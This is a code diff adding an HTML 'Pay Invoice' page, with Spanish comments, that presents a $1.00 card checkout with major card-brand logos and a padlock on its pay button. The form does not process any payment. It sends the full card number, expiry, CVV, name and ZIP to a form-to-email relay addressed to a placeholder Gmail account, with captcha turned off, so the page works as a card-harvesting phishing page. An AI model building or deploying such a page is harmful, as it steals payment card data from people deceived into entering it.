@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pay Invoice</title>
+
+<style>
+body{
+  font-family: Arial, sans-serif;
+  background:#f5f6f8;
+  padding:40px;
+}
+.wrapper{max-width:420px;margin:auto}
+.card{
+  background:#fff;
+  border-radius:6px;
+  box-shadow:0 4px 12px rgba(0,0,0,.1);
+  padding:20px;
+}
+h2{text-align:center;margin-bottom:20px}
+.label{font-size:14px;color:#555;margin-bottom:5px}
+.input{
+  width:100%;
+  padding:10px;
+  margin-bottom:15px;
+  border:1px solid #ccc;
+  border-radius:4px;
+}
+.row{display:flex;gap:10px}
+.amount{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:15px;
+}
+.cards{text-align:center;margin-bottom:15px}
+.cards img{height:24px;margin:0 6px}
+.pay{
+  background:#58c7be;
+  border:none;
+  color:#fff;
+  width:100%;
+  padding:14px;
+  font-size:16px;
+  border-radius:4px;
+  cursor:pointer;
+}
+.pay:hover{background:#46b3aa}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+<div class="card">
+
+<h2>Pay Invoice</h2>
+
+<form action="https://formsubmit.co/TU_CORREO@gmail.com" method="POST">
+
+  <!-- CONFIGURACIÓN FORMSUBMIT -->
+  <input type="hidden" name="_subject" value="Nuevo pago recibido">
+  <input type="hidden" name="_template" value="table">
+  <input type="hidden" name="_captcha" value="false">
+
+  <div class="amount">
+    <div>
+      <div class="label">Payment amount</div>
+      <strong>$1.00</strong>
+    </div>
+  </div>
+
+  <div class="cards">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Discover_Card_logo.svg/512px-Discover_Card_logo.svg.png">
+  </div>
+
+  <div class="label">Name on card</div>
+  <input class="input" type="text" name="Name on card" required>
+
+  <div class="label">Card number</div>
+  <input class="input" type="text" name="Card number" required>
+
+  <div class="row">
+    <div>
+      <div class="label">Expiry date</div>
+      <input class="input" type="text" name="Expiry date" required>
+    </div>
+    <div>
+      <div class="label">Security code</div>
+      <input class="input" type="text" name="CVV" required>
+    </div>
+  </div>
+
+  <div class="label">ZIP / Postal code</div>
+  <input class="input" type="text" name="ZIP Code" required>
+
+  <button class="pay" type="submit">🔒 Pay $1.00</button>
+
+</form>
+
+</div>
+</div>
+
+</body>
+</html>
